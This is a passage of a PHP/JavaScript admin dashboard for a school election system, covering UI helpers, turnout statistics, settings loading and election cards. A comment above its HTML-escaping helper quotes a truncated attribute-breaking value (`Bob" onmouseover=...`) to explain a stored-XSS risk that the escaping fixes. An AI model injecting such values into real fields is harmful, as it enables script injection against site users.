            <div class="avatar" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg></div>
            <div class="user-info">
                <div class="name"><?= h($adminUsername) ?></div>
                <div class="role">Administrator</div>
            </div>
        </div>
        <div class="logout-link">
            <a href="logout.php"><span class="nav-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg></span> Log Out</a>
        </div>
    </div>

    <div class="main-content">
        <div class="page-header">
            <div style="display:flex;align-items:center;gap:.75rem;">
                <button class="hamburger" id="hamburgerBtn" aria-label="Toggle sidebar">☰</button>
                <h1 id="pageHeaderTitle">Dashboard</h1>
            </div>
            <span class="date" id="pageHeaderDate"></span>
        </div>

        <!-- ============ DASHBOARD PANEL ============ -->
        <div class="panel active" id="panel-dashboard"></div>

        <!-- ============ ELECTION PANEL ============ -->
        <div class="panel" id="panel-election"></div>

        <!-- ============ STUDENTS PANEL ============ -->
        <div class="panel" id="panel-students"></div>

        <!-- ============ RESULTS PANEL ============ -->
        <div class="panel" id="panel-results"></div>

        <!-- ============ ARCHIVE (placeholder) ============ -->
        <div class="panel" id="panel-archive"></div>

        <!-- ============ LOGS PANEL ============ -->
        <div class="panel" id="panel-logs"></div>

        <!-- ============ SETTINGS PANEL ============ -->
        <div class="panel" id="panel-settings"></div>
    </div>
</div>

<script>
<?php echo "const CSRF_TOKEN = " . json_encode($csrfToken) . ";\n"; ?>
const ELECTIONS_API = 'api/elections.php';
const STUDENTS_API = 'api/students.php';
const LOGS_API = 'api/logs.php';
const SETTINGS_API = 'api/settings.php';
const NEXT_SCHOOL_YEAR_API = 'api/next-school-year.php';

// ------------------------------------------------------------------
// TOASTS + CONFIRM MODAL
// Shared UI primitives used everywhere below instead of native
// alert()/confirm(), so errors and destructive-action confirmations look
// like part of the app instead of a jarring browser dialog.
// ------------------------------------------------------------------
const toastStack = document.createElement('div');
toastStack.className = 'toast-stack';
document.body.appendChild(toastStack);

const TOAST_ICONS = {
    success: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>',
    error: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>',
    info: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="16" x2="12" y2="11"/><circle cx="12" cy="7.5" r=".5" fill="currentColor" stroke="none"/></svg>',
    warning: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M12 9v4"/><circle cx="12" cy="16.5" r=".5" fill="currentColor" stroke="none"/><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/></svg>',
};

function showToast(message, type = 'info', { duration = 4500, actionLabel = null, onAction = null } = {}){
    const el = document.createElement('div');
    el.className = `toast ${type}`;
    el.innerHTML = `
        <span class="toast-icon">${TOAST_ICONS[type] || TOAST_ICONS.info}</span>
        <span class="toast-msg">${escapeHtml(message)}${actionLabel ? `<br><button type="button" class="toast-action">${escapeHtml(actionLabel)}</button>` : ''}</span>
        <button type="button" class="toast-close" aria-label="Dismiss">✕</button>
    `;
    const remove = () => {
        el.classList.add('leaving');
        setTimeout(() => el.remove(), 200);
    };
    el.querySelector('.toast-close').addEventListener('click', remove);
    if (actionLabel && onAction) {
        el.querySelector('.toast-action').addEventListener('click', () => { onAction(); remove(); });
    }
    toastStack.appendChild(el);
    if (duration) setTimeout(remove, duration);
    return el;
}

// Promise-based replacement for confirm(). Resolves true/false depending
// on which button the admin clicks.
function showConfirmModal({ title, message, confirmLabel = 'Confirm', cancelLabel = 'Cancel', danger = true } = {}){
    return new Promise(resolve => {
        const overlay = document.createElement('div');
        overlay.className = 'modal-overlay';
        overlay.innerHTML = `
            <div class="modal-box" role="alertdialog" aria-modal="true">
                <div class="modal-icon ${danger ? 'danger' : 'neutral'}">
                    ${danger
                        ? '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>'
                        : '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>'}
                </div>
                <h3>${escapeHtml(title || 'Are you sure?')}</h3>
                <p>${escapeHtml(message || '')}</p>
                <div class="modal-actions">
                    <button type="button" class="btn btn-secondary" data-choice="cancel">${escapeHtml(cancelLabel)}</button>
                    <button type="button" class="btn ${danger ? 'btn-danger' : 'btn-primary'}" data-choice="confirm">${escapeHtml(confirmLabel)}</button>
                </div>
            </div>
        `;
        function finish(result){
            overlay.remove();
            document.removeEventListener('keydown', onKey);
            resolve(result);
        }
        function onKey(e){ if (e.key === 'Escape') finish(false); }
        overlay.addEventListener('click', e => { if (e.target === overlay) finish(false); });
        overlay.querySelector('[data-choice="cancel"]').addEventListener('click', () => finish(false));
        overlay.querySelector('[data-choice="confirm"]').addEventListener('click', () => finish(true));
        document.addEventListener('keydown', onKey);
        document.body.appendChild(overlay);
        overlay.querySelector('[data-choice="confirm"]').focus();
    });
}

// ------------------------------------------------------------------
// SIDEBAR / NAV
// ------------------------------------------------------------------
const panelTitles = {dashboard:'Dashboard', election:'Election Management', students:'Students', results:'Live Results', archive:'Archive', logs:'Activity Logs', settings:'Settings'};
async function showPanel(name, focusId){
    if (wizardIsDirty() && !(await showConfirmModal({
        title: 'Discard unsaved changes?',
        message: 'You have unsaved changes in the election you\'re creating or editing. Leaving now will discard them.',
        confirmLabel: 'Discard & Leave',
        danger: true,
    }))) {
        return false;
    }
    if (wizardDraft) {
        wizardDraft = null;
        wizardOriginalSnapshot = null;
    }
    document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
    document.getElementById('panel-' + name).classList.add('active');
    document.querySelectorAll('.nav-link').forEach(a => a.classList.remove('active'));
    document.querySelector('.nav-link[data-panel="' + name + '"]').classList.add('active');
    document.getElementById('pageHeaderTitle').textContent = panelTitles[name] || 'Dashboard';
    if (name === 'dashboard') renderDashboard();
    if (name === 'election') loadElectionList();
    if (name === 'students') renderStudentList(true);
    if (name === 'results') renderResults(focusId);
    if (name === 'logs') renderLogs();
    if (name === 'settings') renderSettings();
    if (name === 'archive') renderArchive();
    toggleSidebar(false);
    window.scrollTo(0,0);
    return true;
}

// Getting Started card helpers - jump straight past the panel and into the
// create/register flow, instead of switching panels and then still
// having to find and click the "+" button there. Bails out cleanly if
// showPanel() itself was cancelled (e.g. the admin had unsaved wizard
// changes and chose not to discard them).
async function quickCreateElection(){
    if (!(await showPanel('election'))) return;
    await loadElectionList();
    openCreateElection();
}
async function quickRegisterStudent(){
    if (!(await showPanel('students'))) return;
    await renderStudentList(true);
    openRegisterStudent();
}

const hamburger = document.getElementById('hamburgerBtn');
const sidebarEl = document.getElementById('sidebar');
const overlayEl = document.getElementById('sidebarOverlay');
function toggleSidebar(open){
    if (open === undefined) open = !sidebarEl.classList.contains('open');
    sidebarEl.classList.toggle('open', open);
    overlayEl.classList.toggle('active', open);
    document.body.style.overflow = open ? 'hidden' : '';
}
hamburger.addEventListener('click', () => toggleSidebar());
overlayEl.addEventListener('click', () => toggleSidebar(false));
window.addEventListener('resize', () => { if (window.innerWidth > 768) toggleSidebar(false); });

// ------------------------------------------------------------------
// THEME SWITCHER (dark / light)
// The actual theme was already applied synchronously in <head> (see the
// inline script right after the stylesheet) to avoid a flash of the
// wrong theme on load. This just wires up the toggle button to reflect
// and change that state, and persists the choice for next visit.
//
// Label + icon describe whichever mode is CURRENTLY ACTIVE ("Light Mode"
// while in light mode, "Dark Mode" while in dark mode) — not the action
// clicking it would perform. The switch position (gray+left = off/light,
// green+right = on/dark) tracks the same state in parallel.
// ------------------------------------------------------------------
const THEME_ICON_MOON = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79Z"/></svg>';
const THEME_ICON_SUN = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/></svg>';
const themeToggleBtn = document.getElementById('themeToggleBtn');
const themeIcon = document.getElementById('themeIcon');
const themeLabel = document.getElementById('themeLabel');

function applyThemeUI(theme){
    const isDark = theme === 'dark';
    themeToggleBtn.setAttribute('aria-checked', String(isDark));
    themeIcon.innerHTML = isDark ? THEME_ICON_MOON : THEME_ICON_SUN;
    themeLabel.childNodes[1].textContent = isDark ? ' Dark Mode' : ' Light Mode';
}

function setTheme(theme){
    document.documentElement.setAttribute('data-theme', theme);
    localStorage.setItem('adminTheme', theme);
    applyThemeUI(theme);
}

themeToggleBtn.addEventListener('click', () => {
    const current = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'light';
    setTheme(current === 'dark' ? 'light' : 'dark');
});

// Reflect whatever the early inline script already applied (it set the
// attribute before this script even loaded).
applyThemeUI(document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'light');

document.getElementById('pageHeaderDate').textContent = new Date().toLocaleDateString('en-US', {weekday:'long', year:'numeric', month:'long', day:'numeric'});

// ------------------------------------------------------------------
// HELPERS
// ------------------------------------------------------------------
// Quote-safe: textContent->innerHTML escapes only & < >, so a
// value like  Bob" onmouseover="...  breaks out of a double-quoted
// HTML attribute (stored XSS — student names are attacker-
// controlled at self-registration). Escape quotes too.
function escapeHtml(str){
    return String(str ?? '').replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
}
// Server-generated timestamps (activity_logs.created_at, via Postgres's
// CURRENT_TIMESTAMP) are stored in UTC, unlike election start/end dates
// which are literal wall-clock values the admin typed in and are never
// converted. Without the explicit "Z", `new Date("2026-08-12 05:05:23")`
// gets parsed as if 05:05 were already the browser's local time — so a
// log written at 05:05 UTC (1:05 PM in a UTC+8 timezone like the
// Philippines) would incorrectly display as "5:05 AM" instead of
// converting to the viewer's actual local time. Appending "Z" tells the
// parser the value is UTC, so toLocaleString()/toLocaleDateString()
// below correctly convert it to whatever timezone the browser is in.
function parseServerTimestamp(str){
    return new Date(str.replace(' ', 'T') + 'Z');
}
function fmtDateTime(iso){
    if (!iso) return '—';
    const d = new Date(iso);
    return d.toLocaleString('en-US', {month:'short', day:'numeric', year:'numeric', hour:'numeric', minute:'2-digit'});
}
function statusLabel(s){
    return {draft:'Draft', scheduled:'Upcoming', ongoing:'Ongoing', paused:'Paused', closed:'Ended', archived:'Archived'}[s] || s;
}
function statusClass(s){
    return {draft:'draft', scheduled:'scheduled', ongoing:'', paused:'paused', closed:'closed', archived:'closed'}[s] || '';
}
// Consistent "For SY 2027-2028" badge — used on election cards, results,
// and archive everywhere an election's target school year should be
// visible. Every election has one (auto-defaulted at creation), so this
// only renders nothing for pre-migration legacy rows with none set.
function syBadgeHtml(label){
    if (!label) return '';
    return `<span class="sy-badge" title="Which school year these officers serve">🎓 SY ${escapeHtml(label)}</span>`;
}
// Fire-and-forget: post an activity line to the real activity_logs table.
// Never awaited by callers and never throws — a logging hiccup should
// never block or fail the actual action that triggered it.
function addLog(text){
    fetch(LOGS_API, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({csrf_token: CSRF_TOKEN, action: text}),
    }).catch(() => {});
}
function logTimeLabel(createdAt){
    const d = parseServerTimestamp(createdAt);
    return d.toLocaleString('en-US', {month:'short', day:'numeric', year:'numeric', hour:'numeric', minute:'2-digit'});
}
function logLine(l){
    return `<div class="log-item"><span class="log-time">${escapeHtml(logTimeLabel(l.created_at))}</span><span class="log-text">${l.admin_username ? `<strong>${escapeHtml(l.admin_username)}</strong> — ` : ''}${escapeHtml(l.action)}</span></div>`;
}
// Tiny inline trend line for the dashboard's turnout-history sparkline.
function sparklineSVG(points, w = 130, h = 32){
    if (points.length < 2) return '';
    const max = Math.max(...points, 1);
    const min = Math.min(...points, 0);
    const range = Math.max(max - min, 1);
    const stepX = w / (points.length - 1);
    const coords = points.map((p, i) => `${(i * stepX).toFixed(1)},${(h - ((p - min) / range) * h).toFixed(1)}`).join(' ');
    return `<svg width="${w}" height="${h}" viewBox="0 0 ${w} ${h}" style="overflow:visible;"><polyline points="${coords}" fill="none" stroke="#84cc16" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg>`;
}

// ------------------------------------------------------------------
// DASHBOARD PANEL (real data from API)
// ------------------------------------------------------------------
async function renderDashboard(){
    document.getElementById('panel-dashboard').innerHTML = `
        <div class="skel-stats">${'<div class="skeleton skel-stat-box"></div>'.repeat(4)}</div>
        <div class="grid-2">
            <div class="skeleton skel-card" style="height:260px;"></div>
            <div class="skeleton skel-card" style="height:260px;"></div>
        </div>
    `;
    try {
        const res = await fetch(ELECTIONS_API);
        const elections = await res.json();
        currentElections = elections; // keep the shared global in sync so eligibleElectionsForStudent()/voteStatusForStudent() below (and anywhere else) see the current election list
        const totalElections = elections.length;
        const active = elections.filter(e => e.status === 'ongoing').length;
        const closed = elections.filter(e => e.status === 'closed').length;
        const scheduled = elections.filter(e => e.status === 'draft' || e.status === 'scheduled').length;

        const students = await fetchStudents(true); // dashboard always shows the freshest numbers
        const totalStudents = students.length;
        // Every denominator on this dashboard uses the same "eligible
        // voter" definition as results.php and electionTurnout(): an
        // active account that isn't dropped or graduated.
        const eligibleStudents = students.filter(isEligibleVoter);
        const eligibleVoters = eligibleStudents.length;

        // "Voted" means the student submitted a ballot (possibly empty) in
        // at least one election they're eligible for. voted_election_ids
        // comes from ballot_submissions, so this matches what the student
        // dashboard and results page report.
        let voted = 0;
        eligibleStudents.forEach(s => {
            const st = voteStatusForStudent(s, '');
            if (st.votedCount > 0) voted++;
        });
        const notVoted = Math.max(eligibleVoters - voted, 0);
        const pct = eligibleVoters ? Math.round((voted/eligibleVoters)*100) : 0;

        const logsRes = await fetch(`${LOGS_API}?limit=5`);
        const logs = logsRes.ok ? await logsRes.json() : [];

        const deptMap = {};
        eligibleStudents.forEach(s => {
            const d = s.department || 'Unknown';
            if (!deptMap[d]) deptMap[d] = {total:0, voted:0};
            deptMap[d].total++;
            const st = voteStatusForStudent(s, '');
            if (st.votedCount > 0) deptMap[d].voted++;
        });
        const deptRows = Object.keys(deptMap).sort().map(d => {
            const info = deptMap[d];
            const p = info.total ? Math.round((info.voted/info.total)*100) : 0;
            return `
            <div class="dept-row">
                <div class="dept-name">${escapeHtml(d)}</div>
                <div class="dept-bar"><div class="progress-bar-track"><div class="progress-bar-fill" style="width:${p}%;"></div></div></div>
                <div class="dept-nums">${info.voted}/${info.total} (${p}%)</div>
            </div>`;
        }).join('');

        const r = 54, circ = 2 * Math.PI * r;
        const votedLen = circ * (pct/100);
        const donut = `
        <svg width="150" height="150" viewBox="0 0 150 150">
            <circle cx="75" cy="75" r="${r}" fill="none" style="stroke:var(--line);" stroke-width="16"></circle>
            <circle cx="75" cy="75" r="${r}" fill="none" stroke="#84cc16" stroke-width="16"
                stroke-dasharray="${votedLen} ${circ - votedLen}" stroke-linecap="round"
                transform="rotate(-90 75 75)"></circle>
            <text x="75" y="70" text-anchor="middle" font-size="26" font-weight="700" style="fill:var(--ink);">${pct}%</text>
            <text x="75" y="90" text-anchor="middle" font-size="11" style="fill:var(--muted);">turnout</text>
        </svg>`;

        // Turnout trend — best-effort only. This is NOT server-side history;
        // it's a small log of turnout snapshots kept in THIS browser's
        // localStorage, recorded at most once every 5 minutes the dashboard
        // is viewed. It resets if the admin switches browsers/devices or
        // clears site data. A real cross-device trend would need a
        // server-side snapshots table — flagging that rather than pretending
        // this is more durable than it is.
        let turnoutHistory = [];
        try { turnoutHistory = JSON.parse(localStorage.getItem('turnoutHistory') || '[]'); } catch(e) { turnoutHistory = []; }
        const lastSnap = turnoutHistory[turnoutHistory.length - 1];
        if (!lastSnap || Date.now() - lastSnap.t > 5 * 60 * 1000) {
            turnoutHistory.push({t: Date.now(), pct});
            if (turnoutHistory.length > 20) turnoutHistory = turnoutHistory.slice(-20);
            try { localStorage.setItem('turnoutHistory', JSON.stringify(turnoutHistory)); } catch(e) {}
        }
        const sparkline = eligibleVoters > 0 ? sparklineSVG(turnoutHistory.map(h => h.pct)) : '';
        // Compares against the PREVIOUS snapshot (index length-2, i.e. the
        // one right before this one), not the oldest one in the rolling
        // 20-entry window — "since your last check" should mean since the
        // last time you looked, not since whenever this window happened
        // to start (which could've been over an hour of checks ago).
        const trendDelta = turnoutHistory.length > 1 ? pct - turnoutHistory[turnoutHistory.length - 2].pct : null;

        const logsPreview = logs.slice(0,5).map(logLine).join('');

        const resultsPreview = elections.filter(e => e.status !== 'archived').slice(0,3).map(e => `
            <div class="results-mini">
                <div class="rm-head">
                    <span class="rm-title">${escapeHtml(e.name)}</span>
                    <span class="status-large ${statusClass(e.status)}"><span class="status-dot"></span>${statusLabel(e.status)}</span>
                </div>
            </div>
        `).join('');

        const gettingStarted = (totalStudents === 0 && totalElections === 0) ? `
            <div class="getting-started">
                <h2>Welcome to your election dashboard</h2>
                <p>Nothing's set up yet — here's how most admins get started.</p>
                <div class="gs-steps">
                    <div class="gs-step">
                        <div class="gs-num">1</div>
                        <h4>Register students</h4>
                        <p>Add the students who'll be eligible to vote.</p>
                        <button class="btn btn-primary btn-sm" onclick="quickRegisterStudent()">+ Register Student</button>
                    </div>
                    <div class="gs-step">
                        <div class="gs-num">2</div>
                        <h4>Create an election</h4>
                        <p>Set up positions, candidates, and a voting schedule.</p>
                        <button class="btn btn-primary btn-sm" onclick="quickCreateElection()">+ Create Election</button>
                    </div>
                </div>
            </div>` : '';

        document.getElementById('panel-dashboard').innerHTML = `
            ${gettingStarted}
            <div class="stats-bar">
                <div class="stat-box">
                    <div class="stat-icon" style="background:rgba(59,130,246,.12);color:var(--blue);"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg></div>
                    <div class="stat-number">${eligibleVoters}</div><div class="stat-label">Eligible Voters</div>
                </div>
                <div class="stat-box">
                    <div class="stat-icon" style="background:rgba(132,204,22,.14);color:var(--lime-dark);"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg></div>
                    <div class="stat-number">${voted}</div><div class="stat-label">Total Voted</div>
                </div>
                <div class="stat-box">
                    <div class="stat-icon" style="background:rgba(245,158,11,.14);color:var(--amber);"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15.5 14"/></svg></div>
                    <div class="stat-number">${notVoted}</div><div class="stat-label">Not Yet Voted</div>
                </div>
                <div class="stat-box">
                    <div class="stat-icon" style="background:rgba(139,92,246,.14);color:var(--purple);"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2.5"/><path d="M7.5 12l3 3 6-6.5"/></svg></div>
                    <div class="stat-number">${active}</div><div class="stat-label">Active Elections</div>
                </div>
            </div>
            <div class="grid-2">
                <div class="card">
                    <h2 class="section-title">Turnout by Department</h2>
                    ${deptRows || '<p class="muted">No students registered.</p>'}
                </div>
                <div class="card">
                    <h2 class="section-title">Overall Turnout</h2>
                    <div class="donut-wrap">
                        ${donut}
                        <div class="donut-legend">
                            <div class="lg-item"><span class="dot" style="background:#84cc16;"></span> Voted — ${voted}</div>
                            <div class="lg-item"><span class="dot" style="background:var(--line-strong);"></span> Not voted — ${notVoted}</div>
                        </div>
                    </div>
                    ${sparkline ? `<div style="text-align:center;">${sparkline}<div class="trend-note">${trendDelta === null ? 'Tracking turnout across your checks on this device' : (trendDelta === 0 ? 'No change since your last check' : `<strong>${trendDelta > 0 ? '▲' : '▼'} ${Math.abs(trendDelta)} pt${Math.abs(trendDelta)===1?'':'s'}</strong> since your last check`)} <em>(this device only)</em></div></div>` : ''}
                    <h3 style="font-size:.95rem;margin:1.5rem 0 .5rem;">Insights</h3>
                    <ul class="insight-list">
                        <li>${totalStudents} registered students, ${eligibleVoters} eligible to vote.</li>
                        <li>${pct}% of eligible voters have voted (${voted} of ${eligibleVoters}).</li>
                        <li>${active} elections are currently active.</li>
                        <li>${closed} elections have closed.</li>
                    </ul>
                </div>
            </div>
            <div class="grid-2" style="margin-top:1.5rem;">
                <div class="card">
                    <div class="panel-flex-header">
                        <h2 class="section-title" style="margin:0;">Recent Activity</h2>
                        <button class="btn btn-secondary btn-sm" onclick="showPanel('logs')">View All Logs</button>
                    </div>
                    ${logsPreview || '<p class="muted">No activity yet.</p>'}
                </div>
                <div class="card">
                    <div class="panel-flex-header">
                        <h2 class="section-title" style="margin:0;">Recent Elections</h2>
                        <button class="btn btn-secondary btn-sm" onclick="showPanel('election')">Manage</button>
                    </div>
                    ${resultsPreview || '<p class="muted">No elections created yet.</p>'}
                </div>
            </div>
        `;
    } catch (e) {
        document.getElementById('panel-dashboard').innerHTML = '<div class="alert alert-error">Could not load dashboard data.</div>';
    }
}

// ------------------------------------------------------------------
// ELECTION LIST + WIZARD (fully DB-backed)
// ------------------------------------------------------------------
let currentElections = [];
let electionStatusFilter = 'all'; // 'all' | 'ongoing' | 'paused' | 'scheduled' | 'draft' | 'closed'
let electionSchoolYearFilter = 'all'; // 'all' or a target_school_year_id (string)
const ELECTION_STATUS_ORDER = ['ongoing', 'paused', 'scheduled', 'draft', 'closed'];
const ELECTION_STATUS_GROUP_LABEL = {ongoing:'Ongoing', paused:'Paused', scheduled:'Upcoming', draft:'Drafts', closed:'Ended'};
let wizardDraft = null;
let wizardOriginalSnapshot = null;

// True once anything in the wizard has actually changed from where it
// started (a blank draft, or the election as loaded for editing).
function wizardIsDirty(){
    if (!wizardDraft) return false;
    return JSON.stringify(wizardDraft) !== wizardOriginalSnapshot;
}
let wizardStep = 1;
let wizardInvalidFields = new Set(); // field keys currently showing an inline validation error (see goToCandidates)
// Faculty (departments table) / School Year / Year Level are all
// admin-editable via the Settings panel (api/settings.php) — populated
// from the server instead of a fixed list. Year level is no longer
// picked directly anywhere in this UI: it's computed from a student's
// School Year vs. the active one (see computeYearLevelClient() below,
// mirroring computeYearLevel() in includes/functions.php).
// loadSettingsData() fills these in during init(), before any panel that
// depends on them renders.
let departmentOptions = []; // Faculty codes — variable name kept as-is to avoid touching every call site
let yearOptions = [];
let schoolYearOptions = []; // [{id, label, start_year, is_active, sort_order}, ...]
let activeSchoolYear = null; // the one row from schoolYearOptions with is_active true, or null
let settingsData = { departments: [], year_levels: [], school_years: [] };

// ------------------------------------------------------------------
// ELECTION LOGOS (SSG site-wide logo + per-department DSG logos)
// Populated by loadSettingsData() below, from the same GET /api/settings.php
// response that already feeds departmentOptions/yearOptions/schoolYearOptions.
// ------------------------------------------------------------------
let ssgLogo = null;          // base64 data URL, or null if not uploaded yet
let departmentLogos = {};    // { department_code: base64 data URL or null }

// Generic "institution" glyph — same one includes/functions.php renders
// server-side (defaultElectionLogoSvg()) — shown whenever SSG or a
// department doesn't have a logo uploaded yet, instead of a broken image
// or an emoji.
const ELOGO_PLACEHOLDER_SVG = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="elogo-placeholder"><path d="M3 21h18"/><path d="M5 21V9.5L12 4l7 5.5V21"/><path d="M9 21v-6h6v6"/></svg>';

function electionLogoHtml(type, departmentCode){
    const logo = type === 'SSG' ? ssgLogo : (departmentLogos[departmentCode] || null);
    if (logo) return `<img src="${escapeHtml(logo)}" alt="" class="elogo-img">`;
    return ELOGO_PLACEHOLDER_SVG;
}

async function loadSettingsData(force = false){
    if (!force && (settingsData.departments.length || settingsData.year_levels.length)) return;
    try {
        const res = await fetch(SETTINGS_API);
        settingsData = await res.json();
    } catch (e) {
        settingsData = { departments: [], year_levels: [], school_years: [], site_settings: {} };
    }
    departmentOptions = settingsData.departments.map(d => d.code);
    yearOptions = settingsData.year_levels.map(y => y.name);
    schoolYearOptions = settingsData.school_years || [];
    activeSchoolYear = schoolYearOptions.find(sy => sy.is_active) || null;
    ssgLogo = (settingsData.site_settings && settingsData.site_settings.ssg_logo) || null;
    departmentLogos = {};
    settingsData.departments.forEach(d => { departmentLogos[d.code] = d.logo || null; });
}

// Client-side mirror of currentSchoolYearStartYear() in
// includes/functions.php — school years run June-May, so before June
// we're still in the year that started last calendar year.
function currentSchoolYearStartYearClient(){
    const now = new Date();
    const y = now.getFullYear();
    const m = now.getMonth() + 1; // JS months are 0-11
    return m >= 6 ? y : y - 1;
}
function nextSchoolYearStartYearClient(){
    return currentSchoolYearStartYearClient() + 1;
}

// Client-side mirror of computeYearLevel() in includes/functions.php —
// used so the Students panel can show a student's year level live as the
// admin picks a School Year, without a round trip. Source of truth is
// still whatever the server actually stored (and login.php refreshes it
// on every login regardless).
function computeYearLevelClient(studentStartYear){
    if (!studentStartYear) return { index: null, label: null, blocked: false };
    const index = (currentSchoolYearStartYearClient() - studentStartYear) + 1;
    const label = yearOptions[Math.max(index, 1) - 1] || null;
    return { index, label, blocked: index >= 5 };
}

async function loadElectionList(){
    document.getElementById('panel-election').innerHTML = `
        <div class="panel-flex-header"><div class="skeleton skel-line w40" style="height:24px;width:180px;"></div></div>
        ${'<div class="skeleton skel-card"></div>'.repeat(2)}
    `;
    try {
        const res = await fetch(ELECTIONS_API);
        currentElections = await res.json();
        renderElectionList();
    } catch (e) {
        document.getElementById('panel-election').innerHTML = '<div class="alert alert-error">Failed to load elections.</div>';
    }
}

const ELECTION_STATUS_DOT_COLOR = {ongoing:'#22c55e', paused:'#f59e0b', scheduled:'#6366f1', draft:'#94a3b8', closed:'#ef4444'};

function renderElectionCard(e){
    const now = new Date();
    const start = new Date(e.start_date);
    const end = new Date(e.end_date);
    let remaining = '';
    if (e.status === 'ongoing') {
        const diff = end - now;
        if (diff > 0) {
            const h = Math.floor(diff/3600000), m = Math.floor((diff%3600000)/60000), s = Math.floor((diff%60000)/1000);
            remaining = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
        } else { remaining = '00:00:00'; }
    }
    // Starting/ending now happen automatically based on the saved
    // schedule (see syncElectionStatuses() on the server), so the
    // schedule is only locked once the election has actually begun.
    const schedEditable = e.status !== 'ongoing' && e.status !== 'closed';
    const isClosed = e.status === 'closed';
    const isPaused = e.status === 'paused';
    const isDraft = e.status === 'draft';
    const canStartNow = e.status === 'scheduled';

    let remainingHtml;
    if (e.status === 'ongoing') {
        remainingHtml = `<div class="remaining-time"><strong>Ends in:</strong> <span>${remaining}</span></div>`;
    } else if (isClosed) {
        remainingHtml = `<div class="remaining-time">This election has ended.</div>`;
    } else if (isPaused) {
        remainingHtml = `<div class="remaining-time">Paused — voting is on hold.</div>`;
    } else if (isDraft) {
        remainingHtml = `<div class="remaining-time">Hidden from students — save a schedule to activate</div>`;
    } else {
        remainingHtml = `<div class="remaining-time">Starts automatically on ${fmtDateTime(e.start_date)}</div>`;
    }

    // Primary (lifecycle) actions on the left, Edit/Delete/Archive grouped
    // and pushed to the right via margin-left:auto — keeps the destructive/
    // structural actions visually separate from the day-to-day ones.
    const primaryActions = `
        ${canStartNow ? `<button class="btn btn-primary" onclick="startElection(${e.id})">Start Now</button>` : ''}
        ${isPaused ? `<button class="btn btn-primary" onclick="startElection(${e.id})">Resume</button>` : ''}
        ${(e.status === 'ongoing' || isPaused) ? `<button class="btn btn-danger" onclick="endElection(${e.id})">End Now</button>` : ''}
        <button class="btn btn-secondary" onclick="viewElectionResults(${e.id})">View Live Results</button>
    `;
    const secondaryActions = isClosed
        ? `<button class="btn btn-primary" onclick="archiveElection(${e.id})">Archive</button><button class="btn btn-secondary" onclick="duplicateElection(${e.id})" title="Copy this election into a new draft">Duplicate</button>`
        : `
            ${e.status !== 'ongoing' ? `<button class="btn btn-secondary" onclick="editElection(${e.id})">Edit</button>` : ''}
